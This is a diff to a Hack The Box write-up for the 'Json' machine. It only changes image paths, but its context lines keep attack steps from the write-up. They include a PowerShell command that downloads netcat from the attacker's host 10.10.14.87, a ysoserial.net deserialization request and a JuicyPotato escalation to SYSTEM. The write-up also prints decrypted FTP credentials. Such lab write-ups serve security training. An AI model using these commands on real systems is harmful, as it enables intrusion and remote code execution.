@@ -3,14 +3,14 @@ title: Json
 category: BOX - MEDIUM
 type: htb_box
 layout: page
-img-link: /writeups/htb/boxes/images/json_1.png
+img-link: images/json//json_1.png
 desc: 10.10.10.158 - [MEDIUM] Json by Altelus
 ---
 
 
 # [MEDIUM] Json <br/>
 
-![Json icon](/writeups/htb/boxes/images/json_1.png# icon)
+![Json icon](images/json//json_1.png# icon)
 
 ## Enumeration
 ### NMAP
@@ -155,18 +155,18 @@ We can't login as anonymous
 ### Web Service Enumeration<br>
 
 Checking the page served at port 80:
-![5](/writeups/htb/boxes/images/json_5.png)
+![5](images/json//json_5.png)
 
 <br>
 Quick check for "admin"/"admin" username/password to see if it works.
 
-![6](/writeups/htb/boxes/images/json_6.png)
+![6](images/json//json_6.png)
 It worked as it opens up a dashboard. However, upon further inspection of the links on the dashboard, most of it are dead. 
 <br>
 
 Checking the page source, we can see there is a javascript file called ```app.min.js```. Below are also its contents
 
-![7](/writeups/htb/boxes/images/json_7.png# medium)
+![7](images/json//json_7.png# medium)
 
 <br />
 
@@ -268,7 +268,7 @@ will set a cookie which is a base64 JSON of user info. We can see from the resul
 ```
 <br>
 There is nothing really new in there. Even the password hash is also just "admin".
-![12](/writeups/htb/boxes/images/json_12.png#)
+![12](images/json//json_12.png#)
 <br>
 
 - Result at ```/api/Account``` curl. Since the ```Bearer``` header is for authentication, we just set its value from the value of the cookie given by ```/api/token```.
@@ -307,7 +307,7 @@ However, the result is also the JSON received earlier but only in decoded base64
 
 ## Web Service Exploitation. (Deserialization Exploit)
 However, a malformed json being sent to the server either via two of those links will return an error. 
-![15](/writeups/htb/boxes/images/json_15.png)
+![15](images/json//json_15.png)
 It means that the deserialization of the data is mishandled and can be a vulnerability. We can check this with a tool called [ysoserial.net](https://github.com/pwntester/ysoserial.net).
 <br>
 
@@ -352,7 +352,7 @@ curl http://10.10.10.158/api/Account -H "Content-Type: application/json" -H "Bea
 ```
 This attack made our ping command executed!
 
-![16](/writeups/htb/boxes/images/json_16.png)
+![16](images/json//json_16.png)
 
 With this, I created a python script that inputs our command so our payload will be flexible.
 
@@ -421,7 +421,7 @@ And when the python script asks for its command, enter the following:
 powershell.exe, /c invoke-webrequest http://10.10.14.87:8000/nc64.exe -outfile c:\\Windows\\Temp\\nc.exe
 ```
 
-![17](/writeups/htb/boxes/images/json_17.png)
+![17](images/json//json_17.png)
 <br>
 After the netcat is uploaded, enter the following to the python script:
 ```Bash
@@ -433,13 +433,13 @@ If "powershell.exe" is used immediately, the server doesn't spawn a shell.
 <br>
 We successfuly spawned a shell with "userpool" as our user!
 
-![18](/writeups/htb/boxes/images/json_18.png# medium)
+![18](images/json//json_18.png# medium)
 <br>
 
 ## User Flag
 We can just go to ```C:\Users\userpool\Desktop\``` to get our user flag.
 
-![19](/writeups/htb/boxes/images/json_19.png# big)
+![19](images/json//json_19.png# big)
 
 ## Privilege Escalation
 <br>
@@ -456,14 +456,14 @@ To check privileges:
 whoami /priv
 ```
 
-![20](/writeups/htb/boxes/images/json_20.png# big)
+![20](images/json//json_20.png# big)
 
 Windows 2019 and Windows 10 1809 are unaffected by this but the version of Windows of the server is of earlier version.
 To check system information:
 ```cmd
 systeminfo
 ```
-![21](/writeups/htb/boxes/images/json_21.png# big)
+![21](images/json//json_21.png# big)
 
 ### JuicyPotato Exploitation
 We can use the [JuicyPotato exploit](https://github.com/ohpe/juicy-potato/) to exploit this setting.<br>
@@ -473,7 +473,7 @@ The CLSID I used is this:
 
 
 
-![22](/writeups/htb/boxes/images/json_22.png# big)
+![22](images/json//json_22.png# big)
 <br>
 
 By using the same exploit python script, upload the executable to the server.
@@ -489,7 +489,7 @@ c:\Windows\Temp>.\service.exe -l 3333 -p c:\Windows\System32\cmd.exe -t * -c {9B
 <br>
 After the netcat receives the connection, we are connected as ```NT AUTHORITY\SYSTEM``` on the server. We also should be able to get the root flag.
 
-![23](/writeups/htb/boxes/images/json_23.png# big)
+![23](images/json//json_23.png# big)
 
 <br>
 
@@ -498,11 +498,11 @@ After the netcat receives the connection, we are connected as ```NT AUTHORITY\SY
 ### Enumeration
 If we go to C:\Program Files, there is a folder called "Sync2Ftp" and here is its contents:
 
-![24](/writeups/htb/boxes/images/json_24.png# big)
+![24](images/json//json_24.png# big)
 <br>
 After retrieving the two files, it can now be checked that the executable is .NET executable 
 
-![25](/writeups/htb/boxes/images/json_25.png# big)
+![25](images/json//json_25.png# big)
 
 while the config contains encrypted username, password, and a key.
 <br>
@@ -528,7 +528,7 @@ while the config contains encrypted username, password, and a key.
 ### Reversing the .NET executable
 To reverse or decompile the .NET executable, [dotPeek](https://www.jetbrains.com/decompiler/) is used. After reversing, there is a Encrypt() and Decrypt() function on the decompiled code.
 
-![26](/writeups/htb/boxes/images/json_26.png)
+![26](images/json//json_26.png)
 Focusing on the Decrypt() function, it's stated that it used 3DES-ECB as the encryption algorithm. A little problem is that it has ```useHashing``` variable that decides whether or not to hash the key. 
 
 
@@ -575,11 +575,11 @@ PASS: funnyhtb
 <br>
 ### FTP Login
 Since it is said to "Sync" with FTP, use the credentials first to FTP.
-![27](/writeups/htb/boxes/images/json_27.png# big)
+![27](images/json//json_27.png# big)
 <br>
 
 The credentials worked! Notice also that the root.txt can also be downloaded.
-![28](/writeups/htb/boxes/images/json_28.png)
+![28](images/json//json_28.png)
 
 However, the credentials might have worked for the FTP but it did not work on SMB or on Winrm so it's hard to say if the credentials can help spawn a shell of SYSTEM user.
 <br>
